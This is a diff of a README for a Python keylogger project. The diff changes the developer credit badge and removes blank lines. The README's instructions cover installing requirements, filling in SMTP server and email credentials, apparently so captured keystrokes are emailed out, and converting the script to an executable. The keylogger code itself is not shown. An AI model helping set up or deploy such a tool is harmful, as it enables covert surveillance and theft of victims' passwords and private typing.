@@ -1,6 +1,6 @@
 # Keylogger
 
-![developers](https://img.shields.io/badge/Developed%20By%3A-Furman%20Vlad,%20Shukrum%20Gai,%20Berko%20Tal,%20Hazan%20Ori-red)
+![developers](https://img.shields.io/badge/Developed%20By:-Furman%20Vlad-red)
 
 ## HOW TO RUN THIS PROJECT
 - Download Keylogger.py
@@ -9,7 +9,6 @@
 - Run following command:
 ```
 pip install -r requirements.txt
-
 ```
 - Change these fields in the code:
 ```
@@ -19,7 +18,6 @@ SMTP_SERVER = 'smtp.example.com' ('smtp.office365.com')
 SMTP_PORT = 587
 USERNAME = 'example@example.com' (Same as SENDER_EMAIL)
 PASSWORD = '*********'
-
 ```
 - To make convert the .py script to .exe:
 - Navigate to the directory where your script is located (cd Desktop) and write:
